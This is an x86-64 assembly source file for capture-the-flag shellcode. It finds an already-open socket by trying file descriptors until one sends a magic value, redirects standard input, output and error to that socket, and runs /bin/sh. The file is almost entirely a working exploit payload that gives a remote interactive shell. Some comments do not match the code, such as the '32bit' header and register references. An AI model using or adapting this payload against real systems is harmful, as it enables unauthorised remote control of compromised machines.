	;; Evan Jensen 32bit socket reuse shellcode
	;; Paolo Soto
	;; Mon Mar  4 12:03:49 EST 2013
	;; EBX, ECX, EDX, ??? then stack - but we only need 3		
	;; read = 3, dup2 = 63, execve = 11
	%include "short64.s"
	%include "syscall.s"
	%define MAGIC dword 0xcafef00d

BITS 64
global main

	section .mytext progbits alloc exec

main:
	mov rsi,rsp 		; TODO is this too early?
	xor si,si 		; rsi=some valid stack address

	push byte 20	;adjust for the popularity of the ctf	
	pop rdi
	
	;; rdi is the starting fd to read from, we try each in decending order
	push byte 4;read 4 bytes	
	pop rdx
		
ourread:
	dec rdi 	
%ifdef DEBUG
	jnz ourread.next	
	int 3; this breakpoint triggers if we DON'T find the magic number
	hlt
%endif
	
.next:
	SYSTEM_CALL(read)
	
	cmp al,4  		;check to see if we've received our 4 bytes
	jnz ourread  		;if not, try with another file descriptor
	;;TODO: lets get rid of this cmp al,4 nonsense and save some bytes.
	cmp  [rsi], MAGIC ;this is our magic number %defined on top
	jnz ourread      ; if we don't match try another file descriptor

	
	;; this dup2 code attaches stdin stdout and stderr to our socket
	;; so that we can talk to whatever program we run later
mydup2:
	push byte 2
        pop rsi
copy_stdin_out_err:
        SYSTEM_CALL(dup2)
        dec rsi
        jns copy_stdin_out_err	

	;; OUR SOCKET IS IN EBX
	
	;; now just some local shellcode
	;; execve("/bin/sh", NULL, NULL) 
        xor  rax, rax
        push rax
        mov  rdi, 0x68732f2f6e69622f ;/bin//sh
        push rdi
        mov  al,  execve
        mov  rdi, rsp
        xor  rsi, rsi
        xor  rdx, rdx
        SYSTEM_CALL

	